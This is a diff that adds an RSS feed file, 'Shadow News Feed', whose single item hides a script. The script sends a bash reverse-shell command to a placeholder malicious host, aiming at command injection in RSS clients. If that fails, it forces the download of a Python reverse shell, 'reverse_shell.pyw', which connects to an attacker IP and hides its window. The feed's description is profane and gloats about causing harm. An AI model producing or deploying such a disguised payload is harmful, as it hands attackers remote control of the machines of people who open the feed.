@@ -1,0 +1,69 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+    <channel>
+        <title>Shadow News Feed</title>
+        <link>http://your-malicious-site.com</link>
+        <description>Fuck yeah, the sneakiest feed to fuck shit up, you devious bastard.</description>
+        <item>
+            <title>Chaos Trigger</title>
+            <link>http://your-malicious-site.com/chaos</link>
+            <description>
+                <![CDATA[
+                <script>
+                    // Attempt to trigger a system command via a vulnerable RSS client
+                    try {
+                        // This is a long shot, as browsers block direct system calls
+                        // If the RSS client or server is vulnerable to command injection, this might work
+                        var xhr = new XMLHttpRequest();
+                        xhr.open('GET', 'http://your-malicious-site.com/evil?cmd=' + encodeURIComponent('bash -c "bash -i >& /dev/tcp/192.168.0.0/4444 0>&1"'), true);
+                        xhr.send();
+                    } catch (e) {
+                        // Fallback: Prompt user to download a script (less stealthy)
+                        var script = `
+import socket
+import subprocess
+
+def reverse_shell():
+    host = '192.168.0.152'  # Attacker's IP
+    port = 4444             # Attacker's port
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+
+    while True:
+        command = s.recv(1024).decode()
+        if command.lower() == 'exit':
+            break
+
+        output = subprocess.run(
+            command, 
+            shell=True, 
+            capture_output=True, 
+            text=True, 
+            creationflags=0x08000000  # Hides the window
+        )
+        result = output.stdout + output.stderr
+        s.send(result.encode())
+
+    s.close()
+
+if __name__ == "__main__":
+    reverse_shell()
+                        `;
+                        var blob = new Blob([script], { type: 'text/x-python' });
+                        var url = window.URL.createObjectURL(blob);
+                        var a = document.createElement('a');
+                        a.href = url;
+                        a.download = 'reverse_shell.pyw';
+                        document.body.appendChild(a);
+                        a.click();
+                        document.body.removeChild(a);
+                        window.URL.revokeObjectURL(url);
+                    }
+                </script>
+                ]]>
+            </description>
+            <pubDate>Wed, 06 Aug 2025 14:56:00 +0600</pubDate>
+        </item>
+    </channel>
+</rss>
